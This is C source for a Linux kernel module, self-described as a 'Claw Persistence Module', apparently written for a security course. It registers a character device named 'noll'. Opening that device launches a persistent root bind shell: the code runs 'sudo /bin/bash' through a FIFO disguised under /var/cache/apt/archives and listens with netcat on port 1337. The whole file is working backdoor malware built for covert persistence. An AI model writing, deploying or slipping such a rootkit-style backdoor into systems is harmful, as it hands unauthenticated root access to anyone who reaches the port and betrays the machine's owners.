#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/fs.h>
#include <linux/uaccess.h>
#include <linux/kmod.h>

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Tristan Fletcher (@Cyclawps52)");
MODULE_DESCRIPTION("Claw Persistence Module");
MODULE_VERSION("cleanup-rev5");

int initModule(void);
void exitModule(void);
static int deviceOpen(struct inode*, struct file*);
static int deviceRelease(struct inode*, struct file*);
static ssize_t deviceRead(struct file*, char*, size_t, loff_t*);
static ssize_t deviceWrite(struct file*, const char*, size_t, loff_t*);
static int makePipe(void);
static int bindShell(void);

// for character device
#define SUCCESS 0
#define DEVICE_NAME "noll"
#define BUF_LEN 256
static int major;
static int deviceOpenStatus = 0;
static char msg[BUF_LEN];
static char *msgPtr;
static struct file_operations fops = {
    .read = deviceRead,
    .write = deviceWrite,
    .open = deviceOpen,
    .release = deviceRelease
} ;

// parameter majorNum
static int majorNum = 0;
module_param(majorNum, int, S_IRUGO);
MODULE_PARM_DESC(majorNum, "the assigned major number of character device noll");

int initModule(void){
    int i = 0;
    printk(KERN_INFO "[CSC492] Hello world!\n");

    // character device
    major = register_chrdev(0, DEVICE_NAME, &fops);
    if(major < 0){
        printk(KERN_ALERT "[CSC492] ERROR: Registering character device failed with %d\n", major);
        exitModule();
        return major;
    }
    printk(KERN_INFO "[CSC492] DEBUG: Assigned major number %d\n", major);
	majorNum = major;

    return 0;
}

void exitModule(void){
    unregister_chrdev(major, DEVICE_NAME);
    printk(KERN_INFO "[CSC492] Goodbye world!\n");
}

// cat /dev/csc492dev
static int deviceOpen(struct inode* inode, struct file* file)
{
	if (deviceOpenStatus)
		return -EBUSY;

	// this is the code to run on every cat of the device

	// handle the file read and just output blank data
	static int counter = 0;
	deviceOpenStatus++;
	sprintf(msg, "");
	msgPtr = msg;
	try_module_get(THIS_MODULE);
	
	// actually spawn backdoor bind shell
	bindShell();
	return SUCCESS;
}

static int deviceRelease(struct inode* inode, struct file* file)
{
	deviceOpenStatus--;		
	module_put(THIS_MODULE);
	return 0;
}

static ssize_t deviceRead(struct file* filp, char* buffer, size_t length, loff_t* offset)
{
	int bytesRead = 0;

	if (*msgPtr == 0)
		return 0;

	while (length && *msgPtr) {
		put_user(*(msgPtr++), buffer++);
		length--;
		bytesRead++;
	}

	return bytesRead;
}

static ssize_t deviceWrite(struct file* filp, const char* buff, size_t len, loff_t* off)
{
	// depreciated in latest kernel version, but must be kept for compatibility
	return -EINVAL;
}

static int destroyPipe(void){
	// rm /var/cache/apt/archives/null >/dev/null &
	char* argv[] = {"/bin/sh", "rm /var/cache/apt/archives/null >/dev/null &", NULL};
	static char* env[] = {
		"HOME=/",
		"TERM=linux",
		"PATH=/sbin:/bin:/usr/sbin:/usr/bin", 
		NULL
	};

	return call_usermodehelper(argv[0], argv, env, UMH_WAIT_PROC);
}

static int makePipe(void){
	// mkfifo /var/cache/apt/archives/null
	char* argv[] = {"/usr/bin/mkfifo", "/var/cache/apt/archives/null", NULL};
	static char* env[] = {
		"HOME=/",
		"TERM=linux",
		"PATH=/sbin:/bin:/usr/sbin:/usr/bin", 
		NULL
	};

	return call_usermodehelper(argv[0], argv, env, UMH_WAIT_PROC);
}

static int bindShell(void){
	destroyPipe();
	makePipe();
	// while true; do cat /var/cache/apt/archives/null | sudo /bin/bash 2>&1 |/bin/nc -l 1337 >/var/cache/apt/archives/null; done >/dev/null &
	char* argv[] = {"/bin/sh", "-c", "while true; do cat /var/cache/apt/archives/null | sudo /bin/bash 2>&1 |/bin/nc -l 1337 >/var/cache/apt/archives/null; done >/dev/null &", NULL};
	static char* env[] = {
		"HOME=/",
		"TERM=linux",
		"PATH=/sbin:/bin:/usr/sbin:/usr/bin", 
		NULL
	};

	return call_usermodehelper(argv[0], argv, env, UMH_WAIT_PROC);
}

module_init(initModule);
module_exit(exitModule);